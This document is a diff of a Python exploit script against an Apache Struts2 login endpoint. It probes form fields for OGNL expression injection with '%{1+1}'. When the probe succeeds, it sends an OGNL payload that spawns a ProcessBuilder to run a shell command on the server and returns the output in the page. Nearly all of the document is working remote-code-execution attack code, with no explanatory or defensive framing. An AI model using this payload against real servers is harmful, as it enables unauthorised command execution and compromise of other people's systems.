@@ -5,16 +5,10 @@ import urllib
 from urllib import parse
 import bs4
 
-arg_parser = argparse.ArgumentParser()
-print("the scripts has 2 parameters")
-argparse = base_def.start_help(arg_parser)
-url = "http://" + argparse.ip + ":" + argparse.port
-proxies = base_def.default_proxies()
-header = base_def.default_header()
 
-def find_target_get_parameters(url, argparse, header, proxies):
+def find_target_get_parameters(url, header, proxies):
     args_tmp = []
-    response = requests.get(url, headers=header)
+    response = requests.get(url, headers=header, proxies=proxies)
 
     if response.status_code == 200:
         content = response.text
@@ -26,27 +20,47 @@ def find_target_get_parameters(url, argparse, header, proxies):
     return args_tmp
 
 
-def test_target_post(url, argparse, header, proxies):
-    return 0
-
-
-def attack_target_post(url, argparse, header, proxies, command):
-    return 0
-
-
-if __name__ == "__main__":
-    args = find_target_get_parameters(url, argparse, header, proxies)
-    payload = urllib.parse.quote("%{1+1}")
-    post_text = args[0] + "=" + payload + "&" + args[1] + "=" + payload
-
+def target_post_test(url, post_text, header, proxies):
+    bool_result = False
     response1 = requests.post(url + "/login.action", data=post_text, proxies=proxies, headers=header)
 
     if response1.status_code == 200:
-        bool_get = False
         soup_res = bs4.BeautifulSoup(response1.text, 'html.parser')
         for i in soup_res.find_all('input'):
             if i.get('value') == "2":
-                bool_get = True
+                bool_result = True
 
-        if bool_get == True:
-            print("we get it!")
+    return bool_result
+
+
+def attack_target_post(url, args, header, proxies, post_command):
+    result = []
+    response = requests.post(url + "/login.action", data=post_command, proxies=proxies, headers=header)
+    if response.status_code == 200:
+        soup_res = bs4.BeautifulSoup(response.text, 'html.parser')
+        result = soup_res.find_all('table')
+    return result
+
+
+if __name__ == "__main__":
+    #-------------脚本初始化部分--------------------
+    arg_parser = argparse.ArgumentParser()
+    print("the scripts has 2 parameters")
+    argparse = base_def.start_help(arg_parser)
+    proxies = base_def.default_proxies()
+    header = base_def.default_header()
+    shell_command = "pwd"
+    #--------------------------------------------
+
+    url = "http://" + argparse.ip + ":" + argparse.port
+    args = find_target_get_parameters(url=url, header=header, proxies=proxies)
+    payload = urllib.parse.quote("%{1+1}")
+    post_text = args[0] + "=" + payload + "&" + args[1] + "=" + payload
+    command = ("%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\""+shell_command+"\"})).redirectErrorStream(true).start("
+               "),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),"
+               "#e=new char[50000],#d.read(#e),#f=#context.get("
+               "\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new "
+               "java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}")
+    post_command = args[0] + "=" + urllib.parse.quote(command) + "&" + args[1] + "=" + urllib.parse.quote(command)
+    if target_post_test(url=url, header=header, proxies=proxies, post_text=post_text):
+        print(attack_target_post(url=url, args=args, header=header, proxies=proxies, post_command=post_command))
